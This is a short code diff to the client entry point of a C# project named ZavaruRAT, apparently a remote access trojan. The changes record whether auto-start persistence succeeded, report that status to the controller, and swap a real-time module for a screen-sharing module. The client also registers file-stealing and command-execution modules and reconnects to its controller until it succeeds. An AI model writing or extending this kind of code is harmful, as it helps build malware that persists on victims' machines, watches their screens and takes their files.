@@ -12,7 +12,7 @@ using ZavaruRAT.Shared.Models.Client;
 
 Utilities.EnsureOneInstance();
 
-Installation.AddAutoStart();
+var autoStart = Installation.AddAutoStart();
 
 DeviceInfo osInfo;
 try
@@ -26,6 +26,8 @@ catch (Exception e)
 
     osInfo = DeviceInfo.Empty;
 }
+
+osInfo.AutoStart = autoStart;
 
 async Task<ZavaruClient> ConnectUntilSuccessAsync()
 {
@@ -65,7 +67,7 @@ var commandExecutor = new CommandExecutor()
                       .AddModule<ExampleModule>()
                       .AddModule<FileStealerModule>()
                       .AddModule<EmergencyModule>()
-                      .AddModule<RealTimeModule>()
+                      .AddModule<ScreenShareModule>()
                       .AddModule<FunModule>();
 
 var client = await ConnectUntilSuccessAsync();
